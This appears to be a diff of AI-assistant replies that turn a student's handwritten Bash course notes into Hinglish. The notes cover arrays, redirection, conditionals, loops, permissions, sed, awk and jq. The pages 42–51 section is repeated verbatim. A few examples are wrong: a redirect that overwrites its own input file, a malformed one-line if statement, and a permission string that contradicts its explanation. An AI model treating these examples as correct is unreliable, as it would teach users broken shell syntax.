+          * `a[1]="ball"`
+          * `a[2]="one glass"`
+          * **Important:** Variable, `=`, aur value ke beech mein space nahi hona chahiye.
+
+      * **Array ki value dekhna (Access karna):**
+
+          * `${array_ka_naam[index_number]}`
+          * **Jaise:** `echo ${a[0]}` -\> **Output:** `ice`
+          * Curly braces `{}` yahan zaroori hain.
+
+      * **Array banane ka doosra tareeka:**
+
+          * `Days=("mon" "tue" "wed" "thu" "fri")`
+          * `echo ${Days[0]}` -\> **Output:** `mon`
+
+      * **Array ki value change karna:**
+
+          * `Days[3]="satyam"`
+          * `echo ${Days[3]}` -\> **Output:** `satyam`
+
+-----
+
+### **Page 37 of 316**
+
+  * **Lesson 64: `cut` Command**
+
+      * **Matlab:** `cut` command kisi file ya string mein se information ke specific hisse ko kaatne (extract) ke kaam aata hai.
+
+      * **Jaise 1:** `echo "Something Inside here" | cut -c 2-5`
+
+          * `-c` ka matlab hai 'character'.
+          * Yeh command string ke 2nd character se lekar 5th character tak sab kuch kaat kar de dega.
+          * **Output:** `omet`
+
+      * **Jaise 2:** `cut -c 3- <<< "String redirect"`
+
+          * `<<<` ka matlab hai "Here String". Yeh `echo` ki tarah hi string ko command ka input banata hai.
+          * Yeh command 3rd character se aage sab kuch de dega.
+          * **Output:** `ring redirect`
+
+  * **Important Note:** Agar aap array banate waqt galti se space de dete hain, jaise `a[0] = "ball"`, toh shell `a[0]` ko ek command samjhega, `=` ko doosra aur `"ball"` ko teesra, jiski wajah se 'command not found' error aayega.
+
+-----
+
+### **Page 38 of 316**
+
+  * **Udemy Course: Linux Bash Shell Scripting Complete Guide**
+
+      * **Scripts mein Variable Use karna:**
+      * Variable ko value assign karne ke 3 tareeke hain:
+        1.  **Explicit Definition:** Seedhe value de dena.
+        2.  **Read Command:** User se input lekar.
+        3.  **Command Substitution:** Kisi command ke output ko value banakar.
+
+  * **1. Explicit Definition**
+
+      * **Syntax:** `VAR=value`
+      * **Important:** Variable ke naam, `=` (equal sign), aur value ke beech mein koi space nahi hona chahiye. Agar aap space denge, toh shell usse command samajhne ki koshish karega.
+      * **Jaise (Sahi):** `count=5`
+      * **Jaise (Sahi):** `path=/var/lib`
+
+-----
+
+### **Page 39 of 316**
+
+  * **Variable Assignment (Continuation):**
+
+      * **Jaise:** `Message=hello`
+
+          * Yahan aap bina quotes ke text assign kar sakte hain.
+
+      * **Jaise:** `Message="hello buddy"`
+
+          * Agar aapki value (string) mein space hai, toh aapko single quotes (`' '`) ya double quotes (`" "`) ka use karna zaroori hai. Varna shell `hello` ko ek command aur `buddy` ko uska argument samjhega.
+
+  * **Variable ko Access karna:**
+
+      * Kisi bhi variable ki value ko use karne ke liye, uske naam ke aage dollar sign (`$`) lagayein.
+      * **Jaise:** `Message="hello buddy"`
+      * `echo $Message`
+      * **Important:** `$` aur variable ke naam ke beech mein space nahi hona chahiye.
+
+-----
+
+### **Page 40 of 316**
+
+  * **Variable Assign karne ke baaki tareeke:**
+      * **ii) `read` Command ka Use:**
+
+          * Yeh command user se input lene ke liye use hota hai.
+          * **Example Script:**
+            ```bash
+            #!/bin/bash
+            echo -n "Enter your age "
+            read Age
+            echo "your age is $Age"
+            ```
+
+      * **iii) Command Substitution:**
+
+          * Kisi command ke output ko variable ki value set karna.
+          * **Syntax:** `VAR=$(command)`
+          * **Example Script:**
+            ```bash
+            #!/bin/bash
+            menu=$(pwd)
+            echo "$menu"
+            ```
+
+-----
+
+### **Page 41 of 316**
+
+  * **Exit Status**
+      * **Matlab:** Exit Status ek numerical value (number) hoti hai jo har command ke run hone ke baad milti hai. Yeh batati hai ki pichla command safalta se chala ya usmein koi galti hui.
+
+      * Hum pichle command ka return value (exit status) `echo $?` command se pata kar sakte hain.
+
+          * **`$?`**: Yeh ek special variable hai jismein hamesha pichle command ka exit status store hota hai.
+          * **Return Value `0`**: Iska matlab hai ki command safalta se (successfully) execute ho gaya.
+          * **Return Value Non-Zero (1, 2, 127, etc.)**: Iska matlab hai ki command mein koi galti hui. Jaise, script mein galat argument dena, ya aisi file use karna jo hai hi nahi.
+
+      * **Example:**
+
+          * i) `let VAR=5*5` (Yeh sahi command hai)
+          * ii) `echo $?` -\> **Output:** `0` (Matlab command safal raha)
+          * iii) `let VAR=5*String` (Yeh galat hai, number ko string se multiply nahi kar sakte)
+          * iv) `echo $?` -\> **Output:** `1` (Matlab command mein galti hui)
+
+-----
+
+Aapke notes kaafi detail mein hain. Agar aage aur pages hain, toh aap unhe bhi bhej sakte hain\!
+
+
+=============================================================
+
+Zaroor\! Maine aapke sabhi naye pages se text extract karke unhe page number ke hisaab se Hinglish mein convert kar diya hai. Yeh rahe aapke aage ke notes:
+
+-----
+
+### **Page 42 of 316** (Page 41 ka continuation)
+
+  * **Redirection aur Piping**
+
+  * Hum command line par jo bhi program chalate hain, uske paas teen (3) data streams hote hain:
+
+      * **i) STDIN (Standard Input - Descriptor 0):** Yeh program ko diya gaya input data hota hai.
+      * **ii) STDOUT (Standard Output - Descriptor 1):** Yeh program ka normal result ya output hota hai, jo by default terminal (screen) par dikhta hai.
+      * **iii) STDERR (Standard Error - Descriptor 2):** Yeh program ka error message hota hai, jo by default terminal (screen) par dikhta hai.
+
+  * **Examples:**
+
+      * **Output ko Redirect karne ke liye (`>`):**
+          * `cat file.txt > output.txt` (Yahan `1>` bhi likh sakte hain, par `>` ka matlab hi STDOUT ko redirect karna hota hai).
+      * **Sirf Error ko Redirect karne ke liye (`2>`):**
+          * `cat file.txt 2> error.txt`
+      * **Output aur Error ko alag-alag files mein bhejne ke liye:**
+          * `cat file.txt > output.txt 2> error.txt`
+      * **Output aur Error dono ko ek hi file mein bhejne ke liye (`&>`):**
+          * `cat file.txt &> file.txt`
+
+-----
+
+### **Page 43 of 316**
+
+  * **Piping (`|`)**
+
+      * **Matlab:** Ek program ke output ko doosre program ka input banana.
+      * **Jaise:** `cat file.txt | head -5 | tail -3 | wc -l`
+          * Is example mein, `cat file.txt` ka output `head -5` ko as an input milta hai. Phir `head -5` ka output `tail -3` ko milta hai, aur aakhir mein `wc -l` ka final output terminal par dikhaya jaata hai.
+
+  * **Lesson 65 -\> `stat` Command in Linux**
+
+      * **Matlab:** `stat` command kisi bhi file ya folder ke baare mein poori detail jaankari (metadata) deta hai.
+      * **Jaise:** `stat index.txt`
+      * **Output mein kya dikhega:**
+          * File ka size
+          * File ki permissions (Jaise: `0775/-rwxrwxr-x`)
+          * File ko kab modify kiya gaya (Modify Date)
+          * Aur bhi bahut kuch.
+
+-----
+
+### **Page 44 of 316**
+
+  * **`if` Statement ka Syntax**
+      * **Pehla Tareeka (Standard):**
+
+        ```bash
+        if [ condition ]; then
+           # Statement jab condition sach ho
+        elif [ condition ]; then
+           # Doosra statement
+        else
+           # Statement jab koi bhi upar ki condition sach na ho
+        fi
+        ```
+
+          * `fi` likhna zaroori hai, isse `if` block band hota hai.
+          * `[` aur `]` ke aas paas space hona zaroori hai.
+
+      * **Doosra Tareeka (Single Line):**
+
+        ```bash
+        if [ condition; ]; then statement; fi
+        ```
+
+          * Is tareeke mein `then` se pehle semicolon (`;`) lagana zaroori hai.
+
+-----
+
+### **Page 45 of 316**
+
+  * **`if` Statement ke saath Logical Operators**
+      * **AND (`&&`):** Jab aap chahte hain ki dono conditions sach (true) hon.
+
+        ```bash
+        if [ condition1 ] && [ condition2 ]; then
+            # statement
+        fi
+        ```
+
+      * **OR (`||`):** Jab aap chahte hain ki dono mein se koi ek bhi condition sach (true) ho.
+
+        ```bash
+        if [ condition1 ] || [ condition2 ]; then
+            # statement
+        fi
+        ```
+
+      * **Negate / NOT (`!`):** Condition ko ulta karne ke liye.
+
+        ```bash
+        if ! [ condition ]; then
+            # statement
+        fi
+        ```
+
+          * **Important:** `!` aur `[` ke beech mein space hona zaroori hai.
+
+-----
+
+### **Page 46 of 316**
+
+  * **String Comparison (Do strings ko compare karna)**
+      * **Tareeka 1: Single Brackets `[ ]`**
+
+          * `[ "$STR1" == "$STR2" ]` (Kya STR1 aur STR2 barabar hain?)
+          * `[ "$STR1" != "$STR2" ]` (Kya STR1 aur STR2 barabar nahi hain?)
+          * **Note:** Single brackets ke saath variables ko double quotes (`" "`) mein likhna ek acchi aadat hai.
+
+      * **Tareeka 2: Double Brackets `[[ ]]`**
+
+          * Agar aap variables ke aas paas double quotes nahi lagana chahte, toh `[[ ]]` ka use karna behtar hai. Yeh zyada advanced aur safe hai.
+          * `[[ $STR1 == $STR2 ]]`
+          * `[[ $STR1 != $STR2 ]]`
+          * Dono tareeke sahi hain.
+
+-----
+
+### **Page 47 of 316**
+
+  * **String Comparison (Alphabetical Order)**
+      * Strings ko alphabetically (dictionary order) compare karne ke liye `<` (chota hai) aur `>` (bada hai) ka use hota hai.
+      * `[[ $STR1 < $STR2 ]]` (Kya STR1, STR2 se pehle aata hai?)
+      * `[[ $STR1 > $STR2 ]]` (Kya STR1, STR2 ke baad aata hai?)
+      * **Important:** Alphabetical comparison ke liye hamesha double square brackets `[[ ]]` ka hi use karna padta hai. Single brackets `[ ]` yahan kaam nahi karte.
+
+-----
+
+### **Page 48 of 316**
+
+  * **Wildcards (Summary Table)**
+
+      * **`?`**: Koi bhi ek single character. (Jaise: `help?` -\> `helpr`, `helpt` se match hoga).
+      * **`*`**: Kitne bhi characters (zero ya zyada). (Jaise: `ca*` -\> `car`, `carpet` se match hoga).
+      * **`[ ]`**: Range mein se koi ek character. (Jaise: `file[0-2]` -\> `file0`, `file1`, `file2` se match hoga).
+      * **`{ }`**: Comma se alag ki gayi poori strings. (Jaise: `*.{txt,pdf}` -\> `.txt` aur `.pdf` dono se match hoga).
+      * **`[! ]`**: Bracket mein list kiye gaye characters ko chhodkar koi bhi ek character.
+
+  * **Character Classes (Inhe `[ ]` ke andar use karein)**
+
+      * **`[[:upper:]]`**: Sirf bade akshar (UPPERCASE letters).
+      * **`[[:lower:]]`**: Sirf chote akshar (lowercase letters).
+      * **`[[:alpha:]]`**: Sirf alphabets.
+      * **`[[:digit:]]`**: Sirf numbers.
+      * **`[[:alnum:]]`**: Sirf alphabets ya numbers.
+      * **`[[:space:]]`**: Whitespace characters (space, tab, etc.).
+
+-----
+
+### **Page 49 of 316**
+
+  * **String Comparison mein Wildcards ka Use**
+
+      * Aap wildcards ka istemaal `[[ ]]` ke andar kar sakte hain.
+      * **Jaise:** `[[ $STRING == file[0-9].txt ]]` ya `[[ $STRING == rich* ]]`
+
+  * **`for` loops**
+
+      * **Syntax 1 (List-based):**
+        ```bash
+        for var in item1 item2 item3; do
+            # commands
+        done
+        ```
+      * **Syntax 2 (C-Style):**
+        ```bash
+        for (( i=1; i<=10; i++ )); do
+            echo $i
+        done
+        ```
+          * **Output:** `1 2 3 4 5 6 7 8 9 10`
+
+-----
+
+### **Page 50 of 316**
+
+  * **`while` loop**
+
+      * **Matlab:** Jab tak di gayi condition sach (true) rehti hai, tab tak loop chalta rehta hai.
+      * **Syntax:**
+        ```bash
+        while [ condition ]; do
+            # commands
+        done
+        ```
+      * **C-Style `while` loop:** `while (( condition )); do ... done`
+
+  * **`case` statement**
+
+      * **Matlab:** Yeh `if-elif-else` ka ek aasan alternative hai.
+      * **Syntax:**
+        ```bash
+        case "$VARIABLE" in
+            "pattern1")
+                # commands...
+                ;;
+            "pattern2")
+                # commands...
+                ;;
+            *)  # Default case (agar kuch bhi match na ho)
+                # commands...
+                ;;
+        esac
+        ```
+
+-----
+
+### **Page 51 of 316**
+
+  * **Arrays (Recap)**
+
+      * **Banana:** `MyArray=(Value1 Value2 Value3)`
+      * **Use karna (Calling):**
+          * `echo ${MyArray[0]}` -\> **Output:** `Value1`
+          * `echo ${MyArray[@]}` -\> **Matlab:** Array ke saare items ek saath print karna.
+
+  * **Functions (Recap)**
+
+      * **Syntax:**
+        ```bash
+        function_name () {
+            # commands
+        }
+        ```
+      * **Example:**
+        ```bash
+        hello () {
+            echo "hello $1"
+        }
+
+        hello Richard
+        ```
+          * **Output:** `hello Richard`
+
+-----
+
+Aapke notes bahut detail mein cover kar rahe hain\! Koi aur page ho to batana.
+
+=============================================================
+
+Zaroor\! Maine aapke sabhi naye pages se text extract karke unhe page number ke hisaab se Hinglish mein convert kar diya hai. Yeh rahe aapke aage ke notes:
+
+-----
+
+### **Page 42 of 316** (Page 41 ka continuation)
+
+  * **Redirection aur Piping**
+
+  * Hum command line par jo bhi program chalate hain, uske paas teen (3) data streams hote hain:
+
+      * **i) STDIN (Standard Input - Descriptor 0):** Yeh program ko diya gaya input data hota hai.
+      * **ii) STDOUT (Standard Output - Descriptor 1):** Yeh program ka normal result ya output hota hai, jo by default terminal (screen) par dikhta hai.
+      * **iii) STDERR (Standard Error - Descriptor 2):** Yeh program ka error message hota hai, jo by default terminal (screen) par dikhta hai.
+
+  * **Examples:**
+
+      * **Output ko Redirect karne ke liye (`>`):**
+          * `cat file.txt > output.txt` (Yahan `1>` bhi likh sakte hain, par `>` ka matlab hi STDOUT ko redirect karna hota hai).
+      * **Sirf Error ko Redirect karne ke liye (`2>`):**
+          * `cat file.txt 2> error.txt`
+      * **Output aur Error ko alag-alag files mein bhejne ke liye:**
+          * `cat file.txt > output.txt 2> error.txt`
+      * **Output aur Error dono ko ek hi file mein bhejne ke liye (`&>`):**
+          * `cat file.txt &> file.txt`
+
+-----
+
+### **Page 43 of 316**
+
+  * **Piping (`|`)**
+
+      * **Matlab:** Ek program ke output ko doosre program ka input banana.
+      * **Jaise:** `cat file.txt | head -5 | tail -3 | wc -l`
+          * Is example mein, `cat file.txt` ka output `head -5` ko as an input milta hai. Phir `head -5` ka output `tail -3` ko milta hai, aur aakhir mein `wc -l` ka final output terminal par dikhaya jaata hai.
+
+  * **Lesson 65 -\> `stat` Command in Linux**
+
+      * **Matlab:** `stat` command kisi bhi file ya folder ke baare mein poori detail jaankari (metadata) deta hai.
+      * **Jaise:** `stat index.txt`
+      * **Output mein kya dikhega:**
+          * File ka size
+          * File ki permissions (Jaise: `0775/-rwxrwxr-x`)
+          * File ko kab modify kiya gaya (Modify Date)
+          * Aur bhi bahut kuch.
+
+-----
+
+### **Page 44 of 316**
+
+  * **`if` Statement ka Syntax**
+      * **Pehla Tareeka (Standard):**
+
+        ```bash
+        if [ condition ]; then
+           # Statement jab condition sach ho
+        elif [ condition ]; then
+           # Doosra statement
+        else
+           # Statement jab koi bhi upar ki condition sach na ho
+        fi
+        ```
+
+          * `fi` likhna zaroori hai, isse `if` block band hota hai.
+          * `[` aur `]` ke aas paas space hona zaroori hai.
+
+      * **Doosra Tareeka (Single Line):**
+
+        ```bash
+        if [ condition; ]; then statement; fi
+        ```
+
+          * Is tareeke mein `then` se pehle semicolon (`;`) lagana zaroori hai.
+
+-----
+
+### **Page 45 of 316**
+
+  * **`if` Statement ke saath Logical Operators**
+      * **AND (`&&`):** Jab aap chahte hain ki dono conditions sach (true) hon.
+
+        ```bash
+        if [ condition1 ] && [ condition2 ]; then
+            # statement
+        fi
+        ```
+
+      * **OR (`||`):** Jab aap chahte hain ki dono mein se koi ek bhi condition sach (true) ho.
+
+        ```bash
+        if [ condition1 ] || [ condition2 ]; then
+            # statement
+        fi
+        ```
+
+      * **Negate / NOT (`!`):** Condition ko ulta karne ke liye.
+
+        ```bash
+        if ! [ condition ]; then
+            # statement
+        fi
+        ```
+
+          * **Important:** `!` aur `[` ke beech mein space hona zaroori hai.
+
+-----
+
+### **Page 46 of 316**
+
+  * **String Comparison (Do strings ko compare karna)**
+      * **Tareeka 1: Single Brackets `[ ]`**
+
+          * `[ "$STR1" == "$STR2" ]` (Kya STR1 aur STR2 barabar hain?)
+          * `[ "$STR1" != "$STR2" ]` (Kya STR1 aur STR2 barabar nahi hain?)
+          * **Note:** Single brackets ke saath variables ko double quotes (`" "`) mein likhna ek acchi aadat hai.
+
+      * **Tareeka 2: Double Brackets `[[ ]]`**
+
+          * Agar aap variables ke aas paas double quotes nahi lagana chahte, toh `[[ ]]` ka use karna behtar hai. Yeh zyada advanced aur safe hai.
+          * `[[ $STR1 == $STR2 ]]`
+          * `[[ $STR1 != $STR2 ]]`
+          * Dono tareeke sahi hain.
+
+-----
+
+### **Page 47 of 316**
+
+  * **String Comparison (Alphabetical Order)**
+      * Strings ko alphabetically (dictionary order) compare karne ke liye `<` (chota hai) aur `>` (bada hai) ka use hota hai.
+      * `[[ $STR1 < $STR2 ]]` (Kya STR1, STR2 se pehle aata hai?)
+      * `[[ $STR1 > $STR2 ]]` (Kya STR1, STR2 ke baad aata hai?)
+      * **Important:** Alphabetical comparison ke liye hamesha double square brackets `[[ ]]` ka hi use karna padta hai. Single brackets `[ ]` yahan kaam nahi karte.
+
+-----
+
+### **Page 48 of 316**
+
+  * **Wildcards (Summary Table)**
+
+      * **`?`**: Koi bhi ek single character. (Jaise: `help?` -\> `helpr`, `helpt` se match hoga).
+      * **`*`**: Kitne bhi characters (zero ya zyada). (Jaise: `ca*` -\> `car`, `carpet` se match hoga).
+      * **`[ ]`**: Range mein se koi ek character. (Jaise: `file[0-2]` -\> `file0`, `file1`, `file2` se match hoga).
+      * **`{ }`**: Comma se alag ki gayi poori strings. (Jaise: `*.{txt,pdf}` -\> `.txt` aur `.pdf` dono se match hoga).
+      * **`[! ]`**: Bracket mein list kiye gaye characters ko chhodkar koi bhi ek character.
+
+  * **Character Classes (Inhe `[ ]` ke andar use karein)**
+
+      * **`[[:upper:]]`**: Sirf bade akshar (UPPERCASE letters).
+      * **`[[:lower:]]`**: Sirf chote akshar (lowercase letters).
+      * **`[[:alpha:]]`**: Sirf alphabets.
+      * **`[[:digit:]]`**: Sirf numbers.
+      * **`[[:alnum:]]`**: Sirf alphabets ya numbers.
+      * **`[[:space:]]`**: Whitespace characters (space, tab, etc.).
+
+-----
+
+### **Page 49 of 316**
+
+  * **String Comparison mein Wildcards ka Use**
+
+      * Aap wildcards ka istemaal `[[ ]]` ke andar kar sakte hain.
+      * **Jaise:** `[[ $STRING == file[0-9].txt ]]` ya `[[ $STRING == rich* ]]`
+
+  * **`for` loops**
+
+      * **Syntax 1 (List-based):**
+        ```bash
+        for var in item1 item2 item3; do
+            # commands
+        done
+        ```
+      * **Syntax 2 (C-Style):**
+        ```bash
+        for (( i=1; i<=10; i++ )); do
+            echo $i
+        done
+        ```
+          * **Output:** `1 2 3 4 5 6 7 8 9 10`
+
+-----
+
+### **Page 50 of 316**
+
+  * **`while` loop**
+
+      * **Matlab:** Jab tak di gayi condition sach (true) rehti hai, tab tak loop chalta rehta hai.
+      * **Syntax:**
+        ```bash
+        while [ condition ]; do
+            # commands
+        done
+        ```
+      * **C-Style `while` loop:** `while (( condition )); do ... done`
+
+  * **`case` statement**
+
+      * **Matlab:** Yeh `if-elif-else` ka ek aasan alternative hai.
+      * **Syntax:**
+        ```bash
+        case "$VARIABLE" in
+            "pattern1")
+                # commands...
+                ;;
+            "pattern2")
+                # commands...
+                ;;
+            *)  # Default case (agar kuch bhi match na ho)
+                # commands...
+                ;;
+        esac
+        ```
+
+-----
+
+### **Page 51 of 316**
+
+  * **Arrays (Recap)**
+
+      * **Banana:** `MyArray=(Value1 Value2 Value3)`
+      * **Use karna (Calling):**
+          * `echo ${MyArray[0]}` -\> **Output:** `Value1`
+          * `echo ${MyArray[@]}` -\> **Matlab:** Array ke saare items ek saath print karna.
+
+  * **Functions (Recap)**
+
+      * **Syntax:**
+        ```bash
+        function_name () {
+            # commands
+        }
+        ```
+      * **Example:**
+        ```bash
+        hello () {
+            echo "hello $1"
+        }
+
+        hello Richard
+        ```
+          * **Output:** `hello Richard`
+
+-----
+
+Aapke notes bahut detail mein cover kar rahe hain\! Koi aur page ho to batana.
+
+
+=============================================================
+
+Bilkul! Maine in dono pages se bhi saara text extract karke Hinglish mein convert kar diya hai. Yeh file permissions ka topic bahut important hai.
+
+---
+
+### **Page 52 of 316**
+
+* **Lesson 51 -> Terminal ke liye Permissions**
+    * Unix aur Linux system mein, har file ek **'OWNER'** (maalik) aur ek **'GROUP'** ko assign ki jaati hai.
+        * **OWNER:** Yeh woh user hota hai jo file ka maalik hai.
+        * **GROUP:** Yeh ek ya ek se zyada users ka collection (samooh) hota hai.
+
+    * **`ls -l` command:**
+        * Yeh command current directory mein maujood files ke baare mein detail mein jaankari deta hai.
+        * **Output ka Example:** `-rwx-rw-r-- 1 pulse plugdev 0 ... Alex.txt`
+
+    * **Output ka Matlab:**
+        1.  **Pehla Character (`-`):** File ka type.
+        2.  **Agle 9 Characters (`rwx-rw-r--`):** File ki permissions.
+        3.  **`pulse`:** File ka OWNER (maalik) ka naam.
+        4.  **`plugdev`:** File ke GROUP ka naam.
+
+    * **Ab Sawaal:** `Alex.txt` file ka ek owner (`pulse`) aur ek group (`plugdev`) hai. Toh yeh owner aur group is file ke saath kya kar sakte hain?
+        * Iska jawab permissions wale hisse mein hai (`-rwx-rw-r--`).
+
+* **Permissions ko Samajhna:**
+        * **Pehla Character (File Type):**
+        * Agar yahan `-` (dash) hai, toh iska matlab hai ki yeh ek **file** hai.
+        * Agar yahan `d` hai, toh iska matlab hai ki yeh ek **directory** (folder) hai.
+
+    * **Permission Characters (9 characters):**
+        * Pehle character (file type) ko chhodkar, baaki 9 characters ko hamesha **teen-teen ke group** mein dekha jaata hai.
+        * **Pehla Group (3 char):** Owner ke liye permissions.
+        * **Doosra Group (3 char):** Group ke liye permissions.
+        * **Teesra Group (3 char):** Baaki sabhi (Others) ke liye permissions.
+
+---
+
+### **Page 53 of 316**
+
+* **Permissions ke 3 Groups ka Matlab:**
+
+    1.  **Pehla Group -> OWNER ke liye Permissions (`rwx`)**
+        * Yeh pehle 3 characters file ke maalik (owner) ke permissions ko batate hain. Hamare example mein owner 'pulse' hai.
+        * Owner ke paas `rwx` permissions hain:
+            * **`r` -> Read:** Maalik file ko padh sakta hai.
+            * **`w` -> Write:** Maalik file mein badlav (edit) kar sakta hai.
+            * **`x` -> Execute:** Maalik file ko run (execute) kar sakta hai (agar woh ek script hai).
+
+    2.  **Doosra Group -> GROUP ke liye Permissions (`r-x`)**
+        * Yeh agle 3 characters (4th, 5th, 6th) uss group ke users ke liye hain jisse file judi hui hai. Hamare example mein group 'plugdev' hai.
+        * Group ke paas `r-x` permissions hain:
+            * **`r` -> Read:** Group ke members file ko padh sakte hain.
+            * **`-` -> (Dash):** `w` ki jagah dash ka matlab hai ki group ke members file mein badlav (write) **nahi** kar sakte.
+            * **`x` -> Execute:** Group ke members file ko run (execute) kar sakte hain.
+
+    3.  **Teesra Group -> OTHERS ke liye Permissions (`r--`)**
+        * Yeh aakhiri 3 characters (7th, 8th, 9th) 'baaki sabhi' (others) ke liye hain. Yaani woh users jo na toh file ke maalik hain aur na hi uss group ke member hain.
+        * Baaki sabhi ke paas `r--` permissions hain:
+            * **`r` -> Read:** Baaki sabhi log file ko sirf padh sakte hain.
+            * **`-` -> (Dash):** `w` ki jagah dash ka matlab hai ki woh file mein likh **nahi** sakte.
+            * **`-` -> (Dash):** `x` ki jagah dash ka matlab hai ki woh file ko run **nahi** kar sakte.
+
+---
+
+Yeh Linux ka ek bahut hi fundamental concept hai. Bahut acche se notes banaye hain aapne! Aur koi page ho toh zaroor bhejna.
+
+=============================================================
+
+
+Bilkul! Aapke request ke hisaab se, yeh rahe un missing topics ke notes, bilkul aapke style mein.
+
+Maine topics ko lessons ki tarah group kar diya hai. Yeh raha pehla set:
+
+---
+
+### **Lesson 1: Script ko Mazboot (Robust) Banana**
+
+* **Quoting ka Sahi Istemal**
+    * **Single Quotes (`'...'`)**
+        * **Matlab:** Iske andar jo likha hai, woh waisa ka waisa (literal) rehta hai.
+        * Yeh variables (`$VAR`) ki value ko print nahi karta.
+        * `Eg: name="Satish" -> echo 'Hello $name'`
+        * **Output:** `Hello $name`
+    * **Double Quotes (`"..."`)**
+        * **Matlab:** Iske andar variables ki value aa jaati hai.
+        * **Zaroori:** File names ya user input jismein space ho, uske liye hamesha double quotes use karein.
+        * `Eg: file="My Report.txt" -> ls $file` (Error aayega, 'My' aur 'Report.txt' ko alag samjhega)
+        * `Eg: ls "$file"` (Sahi chalega, "My Report.txt" ko ek hi naam samjhega)
+
+* **Script se Exit karna (Exit Codes)**
+    * **`exit 0`**
+        * **Matlab:** Script ke aakhir mein daalna. Iska matlab hai "Sab kuch theek tha, script safal hui."
+    * **`exit 1`** (ya koi bhi non-zero number)
+        * **Matlab:** Jab script mein koi error aaye tab use karna. Matlab "Kuch gadbad hui, script fail ho gayi."
+    * **`$?`**
+        * **Matlab:** Yeh special variable hamesha pichle command ka exit code batata hai.
+        * `Eg: ./run.sh -> echo $?` (Agar `0` aaya toh script safal hui, agar `1` ya kuch aur aaya toh fail hui)
+        * **Use:** `if [ $? -ne 0 ]; then echo "Error hua!"; exit 1; fi` -> Check karna ki pichla command fail toh nahi hua.
+
+* **Arithmetic Operations (`((...))`)**
+    * **Matlab:** Numbers ke saath kaam karne ke liye `let` se aasan aur C-language jaisa hai.
+    * `Eg: ((count = 10))`
+    * `Eg: ((count++))` -> Value ko 1 se badhana.
+    * `Eg: ((total = count * 5))`
+    * `Eg: if (( total > 50 )); then echo "High"; fi`
+
+---
+
+### **Lesson 2: Debugging aur Error Handling**
+
+* **Debugging Scripts (`set` command)**
+    * **`set -x`**
+        * **Matlab:** Ise script ki shuruaat mein likhne se har command run hone se pehle terminal par print hota hai. Debugging ke liye best hai.
+    * **`set -e`**
+        * **Matlab:** Agar script mein koi bhi command fail ho (non-zero exit status de), toh script wahin ruk jaayegi.
+    * **`set -u`**
+        * **Matlab:** Agar aapne koi aisa variable use kiya jo banaya hi nahi (unset), toh yeh error dekar script ko rok dega.
+    * **`set -o pipefail`**
+        * **Matlab:** Agar pipe (`|`) mein beech ka koi command fail hota hai, toh poori line ka exit status fail maana jaayega.
+
+* **`trap` Command (Cleanup)**
+    * **Matlab:** Yeh sunishchit karta hai ki script ke exit hone par (ya `Ctrl+C` dabane par) koi specific command zaroor chale.
+    * **Use:** Temporary files ko hamesha delete (cleanup) karne ke liye.
+    * `Eg: trap 'rm -f /tmp/my_data*' EXIT` -> Script jaise hi khatam ho (chahe fail ho ya pass), `/tmp/my_data` se shuru hone wali saari files delete kar do.
+    * `Eg: trap 'echo " Aborted!"' SIGINT` -> `Ctrl+C` dabane par " Aborted!" print karo.
+
+
+* **Robust Error Handling & Logging**
+    * **`>&2`**
+        * **Matlab:** Message ko normal output ke bajaye Standard Error (stderr) par bhejna. Error messages ke liye hamesha yeh use karein.
+        * `Eg: echo "Error: File nahi mili." >&2`
+    * **Log File mein daalna**
+        * `Eg: ./my_script.sh > script.log 2> script.error` -> Normal output `script.log` mein aur saare errors `script.error` file mein.
+        * `Eg: ./my_script.sh &> script_complete.log` -> Dono cheezein (output aur error) ek hi file mein.
+
+* **Secure Credential Handling**
+    * **Kyun Zaroori:** Password ko script ke andar plain text mein kabhi mat likho.
+    * **`read -s`**
+        * **Matlab:** User se password maangne ke liye. `-s` (silent) se password screen par type hota hua nahi dikhega.
+        * `Eg: read -s -p "Enter DB Password: " db_pass`
+    * **Environment Variables**
+        * **Matlab:** Password ko script ke bahar set karo.
+        * `Eg: export MY_PASS="123"` -> Phir script ke andar `$MY_PASS` use karo.
+
+---
+
+### **Lesson 3: Advanced Text Processing**
+
+* **`sed` (Stream Editor)**
+    * **Matlab:** File khole bina text ko dhoondhne (find) aur badalne (replace) ke kaam aata hai.
+    * `Eg: sed 's/purana_text/naya_text/g' file.txt`
+        * `s` -> Substitute (Badlo)
+        * `g` -> Global (Line mein har jagah badlo, sirf pehli baar nahi)
+    * `Eg: sed -i 's/error/warning/g' file.txt`
+        * `-i` -> In-place (File ko directly edit kar dega. Original file badal jaayegi).
+    * `Eg: sed '/DELETE/d' file.txt`
+        * `d` -> Delete (Jis line mein "DELETE" likha hai, usse delete kar do).
+
+
+* **`awk`**
+    * **Matlab:** `cut` se bahut zyada powerful hai. Yeh column-based data ko process karta hai.
+    * `Eg: ls -l | awk '{print $1, $9}'`
+        * **Matlab:** `ls -l` ke output ka pehla (`$1`) aur nawaan (`$9`) column print karo.
+    * `Eg: awk -F':' '{print $1}' /etc/passwd`
+        * `-F':'` -> Field Separator (column alag karne wala character) `:` set karo.
+        * **Matlab:** `/etc/passwd` file ka pehla column (username) print karo.
+    * `Eg: awk '/Failed/ {print $1, $3}' auth.log`
+        * **Matlab:** `auth.log` mein sirf "Failed" wali lines ka pehla aur teesra column print karo.
+
+
+* **Regular Expressions (Regex) in Depth**
+    * **Matlab:** Yeh Wildcards (`*`, `?`) se advanced pattern matching hai. `grep`, `sed`, `awk` mein use hota hai.
+    * `grep -E` -> Extended Regex use karne ke liye.
+    * `^` -> Line ki shuruaat (Jaise: `grep -E "^Error"` -> Sirf woh lines jo "Error" se shuru hoti hain).
+    * `$` -> Line ka end (Jaise: `grep -E "\.log$"` -> Sirf woh lines jo ".log" par khatam hoti hain).
+    * `[0-9]+` -> Ek ya ek se zyada numbers.
+    * `\s` -> Space.
+    * `\.` -> Asli dot (`.`) character.
+
+* **`jq` (JSON Processor)**
+    * **Kyun Zaroori:** Aajkal saare APIs aur web tools JSON format mein data dete hain. `grep` se JSON nikalna bahut mushkil hai.
+    * `Eg: cat data.json | jq '.'` -> JSON ko sundar format (pretty print) mein dikhana.
+    * `Eg: cat data.json | jq '.users[0].name'` -> JSON ke andar `users` array ke pehle (`[0]`) item ka `name` nikalna.
+    * `Eg: curl 'api.example.com/data' | jq '.data.status'` -> API se live data nikalna.
+
+
+* **`comm` Command**
+    * **Matlab:** Do **sorted** files ko line-by-line compare karta hai.
+    * **Zaroori:** Files `sort` ki hui honi chahiye.
+    * `Eg: comm file1.txt file2.txt`
+    * **Output (3 Columns):**
+        * Column 1: Sirf file1 mein unique lines.
